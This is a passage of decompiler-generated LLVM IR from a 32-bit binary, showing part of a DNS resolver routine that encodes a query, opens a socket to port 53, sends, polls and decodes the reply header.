  %v3_804bf91 = inttoptr i32 %v2_804bf91 to i32*
  store i32 %v5_804bf8e, i32* %v3_804bf91, align 4
  %v0_804bf95 = load i32, i32* @esp, align 4
  %v1_804bf95 = add i32 %v0_804bf95, 16
  %v1_804bf98 = add i32 %v0_804bf95, 52
  %v2_804bf98 = inttoptr i32 %v1_804bf98 to i32*
  %v3_804bf98 = load i32, i32* %v2_804bf98, align 4
  %v5_804bf98 = icmp slt i32 %v3_804bf98, 0
  br i1 %v5_804bf98, label %dec_label_pc_804bf47.dec_label_pc_804bfde_crit_edge, label %dec_label_pc_804bf9f

dec_label_pc_804bf47.dec_label_pc_804bfde_crit_edge: ; preds = %dec_label_pc_804bf47
  %v0_804bfde.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804bfde

dec_label_pc_804bf9f:                             ; preds = %dec_label_pc_804bf47
  store i32 %v3_804bf98, i32* %eax.global-to-local, align 4
  %v1_804bfa3 = load i32, i32* @global_var_8054998.87, align 8
  %v2_804bfa3 = sub i32 %v3_804bf98, %v1_804bfa3
  %v8_804bfa3 = xor i32 %v1_804bfa3, %v3_804bf98
  %v9_804bfa3 = xor i32 %v2_804bfa3, %v3_804bf98
  %v10_804bfa3 = and i32 %v9_804bfa3, %v8_804bfa3
  %v11_804bfa3 = icmp slt i32 %v10_804bfa3, 0
  %v13_804bfa3 = icmp slt i32 %v2_804bfa3, 0
  %v2_804bfa9 = icmp eq i1 %v13_804bfa3, %v11_804bfa3
  br i1 %v2_804bfa9, label %dec_label_pc_804bfde, label %dec_label_pc_804bfab

dec_label_pc_804bfab:                             ; preds = %dec_label_pc_804bf9f
  %v2_804bfab = add i32 %v0_804bf95, 12
  %v3_804bfab = inttoptr i32 %v2_804bfab to i32*
  store i32 %v3_804bf98, i32* %v3_804bfab, align 4
  %v1_804bfac = add i32 %v0_804bf95, 8
  %v2_804bfac = inttoptr i32 %v1_804bfac to i32*
  store i32 1025, i32* %v2_804bfac, align 4
  %v1_804bfb1 = add i32 %v0_804bf95, 4
  %v2_804bfb1 = inttoptr i32 %v1_804bfb1 to i32*
  store i32 ptrtoint (i32* @global_var_80505ca.88 to i32), i32* %v2_804bfb1, align 4
  %v1_804bfb6 = add i32 %v0_804bf95, 28
  %v2_804bfb6 = inttoptr i32 %v1_804bfb6 to i32*
  %v3_804bfb6 = load i32, i32* %v2_804bfb6, align 4
  %v6_804bfb6 = inttoptr i32 %v0_804bf95 to i32*
  store i32 %v3_804bfb6, i32* %v6_804bfb6, align 4
  %v0_804bfba = call i32 @__GI_strncat()
  store i32 %v0_804bfba, i32* %eax.global-to-local, align 4
  %v0_804bfbf = load i32, i32* @esp, align 4
  %v1_804bfc2 = add i32 %v0_804bfbf, 8
  %v2_804bfc2 = inttoptr i32 %v1_804bfc2 to i32*
  store i32 1025, i32* %v2_804bfc2, align 4
  %v1_804bfc7 = add i32 %v0_804bfbf, 52
  %v2_804bfc7 = inttoptr i32 %v1_804bfc7 to i32*
  %v3_804bfc7 = load i32, i32* %v2_804bfc7, align 4
  store i32 %v3_804bfc7, i32* %edx.global-to-local, align 4
  %v1_804bfcb = mul i32 %v3_804bfc7, 4
  %v2_804bfcb = add i32 %v1_804bfcb, 134564216
  %v3_804bfcb = inttoptr i32 %v2_804bfcb to i32*
  %v4_804bfcb = load i32, i32* %v3_804bfcb, align 4
  %v6_804bfcb = add i32 %v0_804bfbf, 4
  %v7_804bfcb = inttoptr i32 %v6_804bfcb to i32*
  store i32 %v4_804bfcb, i32* %v7_804bfcb, align 4
  %v1_804bfd2 = add i32 %v0_804bfbf, 28
  %v2_804bfd2 = inttoptr i32 %v1_804bfd2 to i32*
  %v3_804bfd2 = load i32, i32* %v2_804bfd2, align 4
  %v6_804bfd2 = inttoptr i32 %v0_804bfbf to i32*
  store i32 %v3_804bfd2, i32* %v6_804bfd2, align 4
  %v0_804bfd6 = call i32 @__GI_strncat()
  store i32 %v0_804bfd6, i32* %eax.global-to-local, align 4
  %v0_804bfdb = load i32, i32* @esp, align 4
  %v1_804bfdb = add i32 %v0_804bfdb, 16
  br label %dec_label_pc_804bfde

dec_label_pc_804bfde:                             ; preds = %dec_label_pc_804bf47.dec_label_pc_804bfde_crit_edge, %dec_label_pc_804bf9f, %dec_label_pc_804bfab
  %v1_804bfde = phi i32 [ %v1_804bf95, %dec_label_pc_804bf47.dec_label_pc_804bfde_crit_edge ], [ %v1_804bf95, %dec_label_pc_804bf9f ], [ %v1_804bfdb, %dec_label_pc_804bfab ]
  %v0_804bfde = phi i32 [ %v0_804bfde.pre, %dec_label_pc_804bf47.dec_label_pc_804bfde_crit_edge ], [ %v3_804bf98, %dec_label_pc_804bf9f ], [ %v0_804bfd6, %dec_label_pc_804bfab ]
  %v2_804bfde = add i32 %v1_804bfde, -4
  %v3_804bfde = inttoptr i32 %v2_804bfde to i32*
  store i32 %v0_804bfde, i32* %v3_804bfde, align 4
  %v0_804bfdf = load i32, i32* %eax.global-to-local, align 4
  %v2_804bfdf = add i32 %v1_804bfde, -8
  %v3_804bfdf = inttoptr i32 %v2_804bfdf to i32*
  store i32 %v0_804bfdf, i32* %v3_804bfdf, align 4
  %v1_804bfe0 = add i32 %v1_804bfde, -12
  %v2_804bfe0 = inttoptr i32 %v1_804bfe0 to i32*
  store i32 1, i32* %v2_804bfe0, align 4
  %v1_804bfe2 = add i32 %v1_804bfde, 184
  store i32 %v1_804bfe2, i32* @eax, align 4
  %v2_804bfe9 = add i32 %v1_804bfde, -16
  %v3_804bfe9 = inttoptr i32 %v2_804bfe9 to i32*
  store i32 %v1_804bfe2, i32* %v3_804bfe9, align 4
  %v2_804bfea = call i32 @__pthread_return_void(i32 -1, i32 %v15_804be94)
  store i32 %v2_804bfea, i32* %eax.global-to-local, align 4
  %v0_804bfef = load i32, i32* @esp, align 4
  %v1_804bfef = add i32 %v0_804bfef, 28
  %v2_804bfef = inttoptr i32 %v1_804bfef to i32*
  %v3_804bfef = load i32, i32* %v2_804bfef, align 4
  store i32 %v3_804bfef, i32* %eax.global-to-local, align 4
  %v1_804bff3 = add i32 %v0_804bfef, 260
  %v2_804bff3 = inttoptr i32 %v1_804bff3 to i32*
  %v3_804bff3 = load i32, i32* %v2_804bff3, align 4
  store i32 %v3_804bff3, i32* @edx, align 4
  %v2_804bffa = add i32 %v0_804bfef, 216
  %v3_804bffa = inttoptr i32 %v2_804bffa to i32*
  store i32 %v3_804bfef, i32* %v3_804bffa, align 4
  %v0_804c001 = load i32, i32* @edx, align 4
  %v1_804c001 = load i32, i32* @esp, align 4
  %v2_804c001 = add i32 %v1_804c001, 220
  %v3_804c001 = inttoptr i32 %v2_804c001 to i32*
  store i32 %v0_804c001, i32* %v3_804c001, align 4
  %v0_804c008 = load i32, i32* @esp, align 4
  %v1_804c008 = add i32 %v0_804c008, 224
  %v2_804c008 = inttoptr i32 %v1_804c008 to i32*
  store i32 1, i32* %v2_804c008, align 4
  %v0_804c018 = load i32, i32* @esp, align 4
  %v1_804c01b = load i32, i32* @ebx, align 4
  %v2_804c01b = sub i32 512, %v1_804c01b
  %v2_804c01d = add i32 %v0_804c018, 8
  %v3_804c01d = inttoptr i32 %v2_804c01d to i32*
  store i32 %v2_804c01b, i32* %v3_804c01d, align 4
  %v1_804c01e = load i32, i32* @ebx, align 4
  %v2_804c01e = add i32 %v1_804c01e, %v2_804be06
  %v2_804c022 = add i32 %v0_804c018, 4
  %v3_804c022 = inttoptr i32 %v2_804c022 to i32*
  store i32 %v2_804c01e, i32* %v3_804c022, align 4
  %v1_804c023 = add i32 %v0_804c018, 216
  store i32 %v1_804c023, i32* @eax, align 4
  %v3_804c02a = inttoptr i32 %v0_804c018 to i32*
  store i32 %v1_804c023, i32* %v3_804c02a, align 4
  %v0_804c02b = call i32 @__encode_question()
  store i32 %v0_804c02b, i32* %eax.global-to-local, align 4
  %v0_804c030 = load i32, i32* @esp, align 4
  store i32 %v0_804c02b, i32* @esi, align 4
  %v2_804c035 = icmp slt i32 %v0_804c02b, 0
  br i1 %v2_804c035, label %dec_label_pc_804c499, label %dec_label_pc_804c03d

dec_label_pc_804c03d:                             ; preds = %dec_label_pc_804bfde
  %v1_804c03d = add i32 %v0_804c030, 172
  %v2_804c03d = inttoptr i32 %v1_804c03d to i16*
  store i16 2, i16* %v2_804c03d, align 2
  %v1_804c047 = load i32, i32* @esp, align 4
  %v2_804c047 = add i32 %v1_804c047, -4
  %v3_804c047 = inttoptr i32 %v2_804c047 to i32*
  store i32 %v0_804c02b, i32* %v3_804c047, align 4
  %v1_804c048 = add i32 %v1_804c047, 164
  store i32 %v1_804c048, i32* %eax.global-to-local, align 4
  %v2_804c04f = add i32 %v1_804c047, -8
  %v3_804c04f = inttoptr i32 %v2_804c04f to i32*
  store i32 %v1_804c048, i32* %v3_804c04f, align 4
  %v1_804c050 = add i32 %v1_804c047, 32
  %v2_804c050 = inttoptr i32 %v1_804c050 to i32*
  %v3_804c050 = load i32, i32* %v2_804c050, align 4
  %v5_804c050 = add i32 %v1_804c047, -12
  %v6_804c050 = inttoptr i32 %v5_804c050 to i32*
  store i32 %v3_804c050, i32* %v6_804c050, align 4
  %v1_804c054 = add i32 %v1_804c047, -16
  %v2_804c054 = inttoptr i32 %v1_804c054 to i32*
  store i32 10, i32* %v2_804c054, align 4
  %v6_804c056 = call i32 @inet_pton(i32 -1, i8* %v5_804c056, i32 %v3_804bef3, i32 ptrtoint (i32* @0 to i32))
  store i32 %v6_804c056, i32* %eax.global-to-local, align 4
  %v0_804c05b = load i32, i32* @esp, align 4
  %v1_804c05b = add i32 %v0_804c05b, 16
  %tmp48 = icmp slt i32 %v6_804c056, 1
  br i1 %tmp48, label %dec_label_pc_804c06c, label %dec_label_pc_804c062

dec_label_pc_804c062:                             ; preds = %dec_label_pc_804c03d
  %v1_804c062 = add i32 %v0_804c05b, 172
  %v2_804c062 = inttoptr i32 %v1_804c062 to i16*
  store i16 10, i16* %v2_804c062, align 2
  %v0_804c06c.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804c06c

dec_label_pc_804c06c:                             ; preds = %dec_label_pc_804c03d, %dec_label_pc_804c062
  %v0_804c083 = phi i32 [ %v1_804c05b, %dec_label_pc_804c03d ], [ %v0_804c06c.pre, %dec_label_pc_804c062 ]
  %v1_804c06c = add i32 %v0_804c083, 156
  %v2_804c06c = inttoptr i32 %v1_804c06c to i16*
  %v3_804c06c = load i16, i16* %v2_804c06c, align 2
  %v12_804c06c = icmp eq i16 %v3_804c06c, 10
  %v1_804c075 = icmp eq i1 %v12_804c06c, false
  %v1_804c083 = add i32 %v0_804c083, 158
  %v2_804c083 = inttoptr i32 %v1_804c083 to i16*
  store i16 13568, i16* %v2_804c083, align 2
  %v0_804c08d = load i32, i32* @esp, align 4
  br i1 %v1_804c075, label %dec_label_pc_804c083, label %dec_label_pc_804c0a3

dec_label_pc_804c083:                             ; preds = %dec_label_pc_804c06c
  %v1_804c090 = add i32 %v0_804c08d, 32
  %v2_804c090 = inttoptr i32 %v1_804c090 to i32*
  %v3_804c090 = load i32, i32* %v2_804c090, align 4
  %v5_804c090 = add i32 %v0_804c08d, -16
  %v6_804c090 = inttoptr i32 %v5_804c090 to i32*
  store i32 %v3_804c090, i32* %v6_804c090, align 4
  %v1_804c094 = call i32 @inet_addr(i32 -1)
  store i32 %v1_804c094, i32* %eax.global-to-local, align 4
  %v1_804c099 = load i32, i32* @esp, align 4
  %v2_804c099 = add i32 %v1_804c099, 176
  %v3_804c099 = inttoptr i32 %v2_804c099 to i32*
  store i32 %v1_804c094, i32* %v3_804c099, align 4
  %v0_804c0a0 = load i32, i32* @esp, align 4
  %v1_804c0a0 = add i32 %v0_804c0a0, 16
  br label %dec_label_pc_804c0a3

dec_label_pc_804c0a3:                             ; preds = %dec_label_pc_804c06c, %dec_label_pc_804c083
  %v1_804c0a3 = phi i32 [ %v1_804c0a0, %dec_label_pc_804c083 ], [ %v0_804c08d, %dec_label_pc_804c06c ]
  %v0_804c0a3 = load i32, i32* @ecx, align 4
  %v2_804c0a3 = add i32 %v1_804c0a3, -4
  %v3_804c0a3 = inttoptr i32 %v2_804c0a3 to i32*
  store i32 %v0_804c0a3, i32* %v3_804c0a3, align 4
  %v1_804c0a4 = add i32 %v1_804c0a3, -8
  %v2_804c0a4 = inttoptr i32 %v1_804c0a4 to i32*
  store i32 17, i32* %v2_804c0a4, align 4
  %v1_804c0a6 = add i32 %v1_804c0a3, -12
  %v2_804c0a6 = inttoptr i32 %v1_804c0a6 to i32*
  store i32 2, i32* %v2_804c0a6, align 4
  %v1_804c0a8 = add i32 %v1_804c0a3, 156
  %v2_804c0a8 = inttoptr i32 %v1_804c0a8 to i16*
  %v3_804c0a8 = load i16, i16* %v2_804c0a8, align 2
  %v4_804c0a8 = zext i16 %v3_804c0a8 to i32
  store i32 %v4_804c0a8, i32* %eax.global-to-local, align 4
  %v2_804c0b0 = add i32 %v1_804c0a3, -16
  %v3_804c0b0 = inttoptr i32 %v2_804c0b0 to i32*
  store i32 %v4_804c0a8, i32* %v3_804c0b0, align 4
  %v4_804c0b1 = call i32 @socket(i32 -1, i32 %v15_804be94, i32 %v3_804bef3)
  store i32 %v4_804c0b1, i32* %eax.global-to-local, align 4
  %v1_804c0b6 = load i32, i32* @esp, align 4
  %v2_804c0b6 = add i32 %v1_804c0b6, 36
  %v3_804c0b6 = inttoptr i32 %v2_804c0b6 to i32*
  store i32 %v4_804c0b1, i32* %v3_804c0b6, align 4
  %v0_804c0ba = load i32, i32* @esp, align 4
  %v1_804c0ba = add i32 %v0_804c0ba, 16
  %v0_804c0bd = load i32, i32* %eax.global-to-local, align 4
  %v2_804c0bd = icmp slt i32 %v0_804c0bd, 0
  br i1 %v2_804c0bd, label %dec_label_pc_804c0ea, label %dec_label_pc_804c0c1

dec_label_pc_804c0c1:                             ; preds = %dec_label_pc_804c0a3
  %v1_804c0c1 = add i32 %v0_804c0ba, 172
  store i32 %v1_804c0c1, i32* %eax.global-to-local, align 4
  %v0_804c0c8 = load i32, i32* @edx, align 4
  %v2_804c0c8 = add i32 %v0_804c0ba, 12
  %v3_804c0c8 = inttoptr i32 %v2_804c0c8 to i32*
  store i32 %v0_804c0c8, i32* %v3_804c0c8, align 4
  %v1_804c0c9 = add i32 %v0_804c0ba, 8
  %v2_804c0c9 = inttoptr i32 %v1_804c0c9 to i32*
  store i32 28, i32* %v2_804c0c9, align 4
  %v0_804c0cb = load i32, i32* %eax.global-to-local, align 4
  %v2_804c0cb = add i32 %v0_804c0ba, 4
  %v3_804c0cb = inttoptr i32 %v2_804c0cb to i32*
  store i32 %v0_804c0cb, i32* %v3_804c0cb, align 4
  %v1_804c0cc = add i32 %v0_804c0ba, 36
  %v2_804c0cc = inttoptr i32 %v1_804c0cc to i32*
  %v3_804c0cc = load i32, i32* %v2_804c0cc, align 4
  %v6_804c0cc = inttoptr i32 %v0_804c0ba to i32*
  store i32 %v3_804c0cc, i32* %v6_804c0cc, align 4
  %v4_804c0d0 = call i32 @__libc_connect(i32 -1, i32 %v15_804be94, i32 %v3_804bef3)
  store i32 %v4_804c0d0, i32* %eax.global-to-local, align 4
  %v0_804c0d5 = load i32, i32* @esp, align 4
  %v2_804c0d8 = icmp slt i32 %v4_804c0d0, 0
  %v1_804c0da = icmp eq i1 %v2_804c0d8, false
  br i1 %v1_804c0da, label %dec_label_pc_804c0f3, label %dec_label_pc_804c0dc

dec_label_pc_804c0dc:                             ; preds = %dec_label_pc_804c0c1
  %v1_804c0dc = call i32 @__errno_location(i32 -1)
  store i32 %v1_804c0dc, i32* %eax.global-to-local, align 4
  %v1_804c0e1 = inttoptr i32 %v1_804c0dc to i32*
  %v2_804c0e1 = load i32, i32* %v1_804c0e1, align 4
  %v11_804c0e1 = icmp eq i32 %v2_804c0e1, 101
  %v0_804c453.pre = load i32, i32* @esp, align 4
  br i1 %v11_804c0e1, label %dec_label_pc_804c453, label %dec_label_pc_804c0ea

dec_label_pc_804c0ea:                             ; preds = %dec_label_pc_804c0dc, %dec_label_pc_804c0a3
  %v17_804c0ea = phi i32 [ %v1_804c0ba, %dec_label_pc_804c0a3 ], [ %v0_804c453.pre, %dec_label_pc_804c0dc ]
  %v1_804c0ea = add i32 %v17_804c0ea, 28
  %v2_804c0ea = inttoptr i32 %v1_804c0ea to i32*
  %v3_804c0ea = load i32, i32* %v2_804c0ea, align 4
  %v4_804c0ea = add i32 %v3_804c0ea, 1
  store i32 %v4_804c0ea, i32* %v2_804c0ea, align 4
  br label %dec_label_pc_804c474.backedge

dec_label_pc_804c0f3:                             ; preds = %dec_label_pc_804c0c1
  %v0_804c0f3 = load i32, i32* @ebx, align 4
  %v1_804c0f3 = load i32, i32* @esi, align 4
  %v2_804c0f3 = add i32 %v1_804c0f3, %v0_804c0f3
  store i32 %v2_804c0f3, i32* %eax.global-to-local, align 4
  %v1_804c0f6 = add i32 %v0_804c0d5, 12
  %v2_804c0f6 = inttoptr i32 %v1_804c0f6 to i32*
  store i32 0, i32* %v2_804c0f6, align 4
  %v0_804c0f8 = load i32, i32* %eax.global-to-local, align 4
  %v2_804c0f8 = add i32 %v0_804c0d5, 8
  %v3_804c0f8 = inttoptr i32 %v2_804c0f8 to i32*
  store i32 %v0_804c0f8, i32* %v3_804c0f8, align 4
  %v2_804c0f9 = add i32 %v0_804c0d5, 4
  %v3_804c0f9 = inttoptr i32 %v2_804c0f9 to i32*
  store i32 %v2_804be06, i32* %v3_804c0f9, align 4
  %v1_804c0fa = add i32 %v0_804c0d5, 36
  %v2_804c0fa = inttoptr i32 %v1_804c0fa to i32*
  %v3_804c0fa = load i32, i32* %v2_804c0fa, align 4
  %v6_804c0fa = inttoptr i32 %v0_804c0d5 to i32*
  store i32 %v3_804c0fa, i32* %v6_804c0fa, align 4
  %v5_804c0fe = call i32 @__libc_send(i32 -1, i32 %v15_804be94, i32 %v3_804bef3, i32 ptrtoint (i32* @0 to i32))
  store i32 %v5_804c0fe, i32* %eax.global-to-local, align 4
  %v0_804c103 = load i32, i32* @esp, align 4
  %v1_804c103 = add i32 %v0_804c103, 36
  %v2_804c103 = inttoptr i32 %v1_804c103 to i32*
  %v3_804c103 = load i32, i32* %v2_804c103, align 4
  %v2_804c107 = add i32 %v0_804c103, 228
  %v3_804c107 = inttoptr i32 %v2_804c107 to i32*
  store i32 %v3_804c103, i32* %v3_804c107, align 4
  %v0_804c10e = load i32, i32* @esp, align 4
  %v1_804c10e = add i32 %v0_804c10e, 232
  %v2_804c10e = inttoptr i32 %v1_804c10e to i16*
  store i16 1, i16* %v2_804c10e, align 2
  %v0_804c118 = load i32, i32* @esp, align 4
  %v1_804c11b = add i32 %v0_804c118, 8
  %v2_804c11b = inttoptr i32 %v1_804c11b to i32*
  store i32 10000, i32* %v2_804c11b, align 4
  %v1_804c120 = add i32 %v0_804c118, 4
  %v2_804c120 = inttoptr i32 %v1_804c120 to i32*
  store i32 1, i32* %v2_804c120, align 4
  %v1_804c122 = add i32 %v0_804c118, 228
  store i32 %v1_804c122, i32* %eax.global-to-local, align 4
  %v3_804c129 = inttoptr i32 %v0_804c118 to i32*
  store i32 %v1_804c122, i32* %v3_804c129, align 4
  %v0_804c12a = call i32 @__libc_poll()
  store i32 %v0_804c12a, i32* %eax.global-to-local, align 4
  %v0_804c12f = load i32, i32* @esp, align 4
  %v1_804c12f = add i32 %v0_804c12f, 16
  %tmp49 = icmp slt i32 %v0_804c12a, 1
  br i1 %tmp49, label %dec_label_pc_804c453, label %dec_label_pc_804c13a

dec_label_pc_804c13a:                             ; preds = %dec_label_pc_804c0f3
  %v1_804c13a = add i32 %v0_804c12f, 12
  %v2_804c13a = inttoptr i32 %v1_804c13a to i32*
  store i32 0, i32* %v2_804c13a, align 4
  %v1_804c13c = add i32 %v0_804c12f, 8
  %v2_804c13c = inttoptr i32 %v1_804c13c to i32*
  store i32 512, i32* %v2_804c13c, align 4
  %v2_804c141 = add i32 %v0_804c12f, 4
  %v3_804c141 = inttoptr i32 %v2_804c141 to i32*
  store i32 %v2_804be06, i32* %v3_804c141, align 4
  %v1_804c142 = add i32 %v0_804c12f, 36
  %v2_804c142 = inttoptr i32 %v1_804c142 to i32*
  %v3_804c142 = load i32, i32* %v2_804c142, align 4
  %v6_804c142 = inttoptr i32 %v0_804c12f to i32*
  store i32 %v3_804c142, i32* %v6_804c142, align 4
  %v5_804c146 = call i32 @__libc_recv(i32 -1, i32 %v15_804be94, i32 %v3_804bef3, i32 ptrtoint (i32* @0 to i32))
  store i32 %v5_804c146, i32* @eax, align 4
  %v1_804c14b = load i32, i32* @esp, align 4
  %v2_804c14b = add i32 %v1_804c14b, 32
  %v3_804c14b = inttoptr i32 %v2_804c14b to i32*
  store i32 %v5_804c146, i32* %v3_804c14b, align 4
  %v0_804c14f = load i32, i32* @esp, align 4
  %v1_804c14f = add i32 %v0_804c14f, 16
  %v7_804c155 = icmp sgt i32 %v5_804c146, 11
  br i1 %v7_804c155, label %dec_label_pc_804c15b, label %dec_label_pc_804c408

dec_label_pc_804c15b:                             ; preds = %dec_label_pc_804c13a
  %v0_804c15b = load i32, i32* @ebx, align 4
  %v2_804c15b = add i32 %v0_804c14f, 12
  %v3_804c15b = inttoptr i32 %v2_804c15b to i32*
  store i32 %v0_804c15b, i32* %v3_804c15b, align 4
  %v0_804c15c = load i32, i32* @ebx, align 4
  %v2_804c15c = add i32 %v0_804c14f, 8
  %v3_804c15c = inttoptr i32 %v2_804c15c to i32*
  store i32 %v0_804c15c, i32* %v3_804c15c, align 4
  %v1_804c15d = add i32 %v0_804c14f, 84
  store i32 %v1_804c15d, i32* %eax.global-to-local, align 4
  %v2_804c161 = add i32 %v0_804c14f, 4
  %v3_804c161 = inttoptr i32 %v2_804c161 to i32*
  store i32 %v1_804c15d, i32* %v3_804c161, align 4
  %v3_804c162 = inttoptr i32 %v0_804c14f to i32*
  store i32 %v2_804be06, i32* %v3_804c162, align 4
  %v0_804c163 = call i32 @__decode_header()
  store i32 %v0_804c163, i32* %eax.global-to-local, align 4
  %v0_804c168 = load i32, i32* @esp, align 4
  %v1_804c168 = add i32 %v0_804c168, 84
  %v2_804c168 = inttoptr i32 %v1_804c168 to i32*
  %v3_804c168 = load i32, i32* %v2_804c168, align 4
  store i32 %v3_804c168, i32* %edx.global-to-local, align 4
  %v2_804c16c = add i32 %v0_804c168, 72
  %v3_804c16c = inttoptr i32 %v2_804c16c to i32*
  store i32 %v3_804c168, i32* %v3_804c16c, align 4
  %v0_804c170 = load i32, i32* @esp, align 4
  %v1_804c170 = add i32 %v0_804c170, 16
  %v1_804c173 = add i32 %v0_804c170, 60
  %v2_804c173 = inttoptr i32 %v1_804c173 to i32*
  %v3_804c173 = load i32, i32* %v2_804c173, align 4
  store i32 %v3_804c173, i32* @eax, align 4
  %v0_804c177 = load i32, i32* %edx.global-to-local, align 4
  %v12_804c177 = icmp eq i32 %v0_804c177, %v3_804c173
  %v1_804c179 = icmp eq i1 %v12_804c177, false
  br i1 %v1_804c179, label %dec_label_pc_804c408, label %dec_label_pc_804c17f

dec_label_pc_804c17f:                             ; preds = %dec_label_pc_804c15b
  %v1_804c17f = add i32 %v0_804c170, 88
  %v2_804c17f = inttoptr i32 %v1_804c17f to i32*
  %v3_804c17f = load i32, i32* %v2_804c17f, align 4
  %v4_804c17f = icmp eq i32 %v3_804c17f, 0
  br i1 %v4_804c17f, label %dec_label_pc_804c408, label %dec_label_pc_804c18a

dec_label_pc_804c18a:                             ; preds = %dec_label_pc_804c17f
  %v1_804c18a = add i32 %v0_804c170, 112
  %v2_804c18a = inttoptr i32 %v1_804c18a to i32*
  %v3_804c18a = load i32, i32* %v2_804c18a, align 4
  store i32 %v3_804c18a, i32* @eax, align 4
  %v9_804c18e = icmp eq i32 %v3_804c18a, 3
  %v1_804c191 = icmp eq i1 %v9_804c18e, false
  br i1 %v1_804c191, label %dec_label_pc_804c1f9, label %dec_label_pc_804c193

dec_label_pc_804c193:                             ; preds = %dec_label_pc_804c18a
  %v1_804c193 = add i32 %v0_804c170, 67
  %v2_804c193 = inttoptr i32 %v1_804c193 to i8*
  %v3_804c193 = load i8, i8* %v2_804c193, align 1
  %v4_804c193 = icmp eq i8 %v3_804c193, 0
  %v1_804c198 = icmp eq i1 %v4_804c193, false
  br i1 %v1_804c198, label %dec_label_pc_804c1e9, label %dec_label_pc_804c19a

dec_label_pc_804c19a:                             ; preds = %dec_label_pc_804c193
  %v0_804c19a = load i32, i32* @ecx, align 4
  %v2_804c19a = add i32 %v0_804c170, 12
  %v3_804c19a = inttoptr i32 %v2_804c19a to i32*
  store i32 %v0_804c19a, i32* %v3_804c19a, align 4
  %v1_804c19b = add i32 %v0_804c170, 8
  %v2_804c19b = inttoptr i32 %v1_804c19b to i32*
  store i32 ptrtoint (i32* @global_var_8052160.32 to i32), i32* %v2_804c19b, align 4
  %v1_804c1a0 = add i32 %v0_804c170, 4
  %v2_804c1a0 = inttoptr i32 %v1_804c1a0 to i32*
  store i32 134526403, i32* %v2_804c1a0, align 4
  %v1_804c1a5 = add i32 %v0_804c170, 200
  store i32 %v1_804c1a5, i32* @esi, align 4
  %v3_804c1ac = inttoptr i32 %v0_804c170 to i32*
  store i32 %v1_804c1a5, i32* %v3_804c1ac, align 4
  %v2_804c1ad = call i32 @__pthread_return_void(i32 -1, i32 %v15_804be94)
  store i32 %v2_804c1ad, i32* %eax.global-to-local, align 4
  %v0_804c1b2 = load i32, i32* @esp, align 4
  %v1_804c1b2 = inttoptr i32 %v0_804c1b2 to i32*
  store i32 ptrtoint (i32* @global_var_8052160.32 to i32), i32* %v1_804c1b2, align 4
  %v1_804c1b9 = call i32 @__pthread_return_0(i32 -1)
  store i32 %v1_804c1b9, i32* %eax.global-to-local, align 4
  %v0_804c1be = load i32, i32* @esp, align 4
  %v1_804c1be = inttoptr i32 %v0_804c1be to i32*
  %v2_804c1be = load i32, i32* %v1_804c1be, align 4
  store i32 %v2_804c1be, i32* @eax, align 4
  %v3_804c1be = add i32 %v0_804c1be, 4
  %v1_804c1bf = inttoptr i32 %v3_804c1be to i32*
  %v2_804c1bf = load i32, i32* %v1_804c1bf, align 4
  store i32 %v2_804c1bf, i32* %edx.global-to-local, align 4
  store i32 1, i32* %v1_804c1bf, align 4
  %v0_804c1c2 = load i32, i32* @esi, align 4
  store i32 %v0_804c1c2, i32* %v1_804c1be, align 4
  %v0_804c1c3 = load i32, i32* @global_var_8054998.87, align 8
  store i32 %v0_804c1c3, i32* %ebx.global-to-local, align 4
  %v2_804c1c9 = call i32 @__pthread_return_void(i32 -1, i32 %v15_804be94)
  store i32 %v2_804c1c9, i32* %eax.global-to-local, align 4
  %v0_804c1ce = load i32, i32* @esp, align 4
  %v1_804c1d1 = add i32 %v0_804c1c3, -1
  store i32 %v1_804c1d1, i32* @ebx, align 4
  %v1_804c1d2 = add i32 %v0_804c1ce, 52
  %v2_804c1d2 = inttoptr i32 %v1_804c1d2 to i32*
  %v3_804c1d2 = load i32, i32* %v2_804c1d2, align 4
  %v5_804c1d2 = sub i32 %v3_804c1d2, %v1_804c1d1
  %v11_804c1d2 = xor i32 %v3_804c1d2, %v1_804c1d1
  %v12_804c1d2 = xor i32 %v5_804c1d2, %v3_804c1d2
  %v13_804c1d2 = and i32 %v12_804c1d2, %v11_804c1d2
  %v14_804c1d2 = icmp slt i32 %v13_804c1d2, 0
  %v16_804c1d2 = icmp slt i32 %v5_804c1d2, 0
  %v2_804c1d6 = icmp eq i1 %v16_804c1d2, %v14_804c1d2
  br i1 %v2_804c1d6, label %dec_label_pc_804c1e9, label %dec_label_pc_804c1d8

dec_label_pc_804c1d8:                             ; preds = %dec_label_pc_804c19a
  %v4_804c1d8 = add i32 %v3_804c1d2, 1
  store i32 %v4_804c1d8, i32* %v2_804c1d2, align 4
  %v0_804c1dc = load i32, i32* @esp, align 4
  %v1_804c1dc = add i32 %v0_804c1dc, 56
  %v2_804c1dc = inttoptr i32 %v1_804c1dc to i32*
  %v3_804c1dc = load i32, i32* %v2_804c1dc, align 4
  store i32 %v3_804c1dc, i32* %edx.global-to-local, align 4
  %v2_804c1e0 = add i32 %v0_804c1dc, 44
  %v3_804c1e0 = inttoptr i32 %v2_804c1e0 to i32*
  store i32 %v3_804c1dc, i32* %v3_804c1e0, align 4
  br label %dec_label_pc_804c474.backedge

dec_label_pc_804c1e9:                             ; preds = %dec_label_pc_804c19a, %dec_label_pc_804c193
  %v0_804c1e9 = call i32 @__GI___h_errno_location()
  store i32 %v0_804c1e9, i32* %eax.global-to-local, align 4
  %v1_804c1ee = inttoptr i32 %v0_804c1e9 to i32*
  store i32 1, i32* %v1_804c1ee, align 4
  br label %dec_label_pc_804c4ac

dec_label_pc_804c1f9:                             ; preds = %dec_label_pc_804c18a
  %v1_804c1f9 = icmp eq i32 %v3_804c18a, 0
  %v1_804c1fb = icmp eq i1 %v1_804c1f9, false
  br i1 %v1_804c1fb, label %dec_label_pc_804c408, label %dec_label_pc_804c201

dec_label_pc_804c201:                             ; preds = %dec_label_pc_804c1f9
  %v1_804c201 = add i32 %v0_804c170, 120
  %v2_804c201 = inttoptr i32 %v1_804c201 to i32*
  %v3_804c201 = load i32, i32* %v2_804c201, align 4
  %tmp50 = icmp slt i32 %v3_804c201, 1
  br i1 %tmp50, label %dec_label_pc_804c211, label %dec_label_pc_804c208

dec_label_pc_804c208:                             ; preds = %dec_label_pc_804c201
  store i32 0, i32* @ebx, align 4
  store i32 12, i32* @esi, align 4
  %v2_804c23056 = add i32 %v0_804c170, 116
  %v3_804c23057 = inttoptr i32 %v2_804c23056 to i32*
  %v4_804c23058 = load i32, i32* %v3_804c23057, align 4
